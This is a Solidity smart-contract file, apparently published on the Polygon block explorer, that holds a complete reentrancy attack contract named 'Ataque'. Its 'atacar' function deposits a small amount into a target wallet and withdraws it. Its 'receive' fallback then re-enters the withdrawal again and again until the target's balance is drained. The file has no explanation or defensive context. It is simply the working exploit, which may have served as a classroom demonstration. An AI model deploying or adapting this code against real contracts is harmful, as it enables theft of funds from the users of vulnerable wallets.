/**
 *Submitted for verification at polygonscan.com on 2022-11-25
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface IWallet {
    function depositar() external payable;
    function retirar() external;
}

contract Ataque {
    IWallet public immutable wallet;

    constructor(IWallet _wallet)  {
        wallet = _wallet;
    }

    function atacar() external payable {
        wallet.depositar{value: 0.001 ether}();
        wallet.retirar();
    }
    
    receive() external payable {
        if (address(wallet).balance >= 0.001 ether)
            wallet.retirar();
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}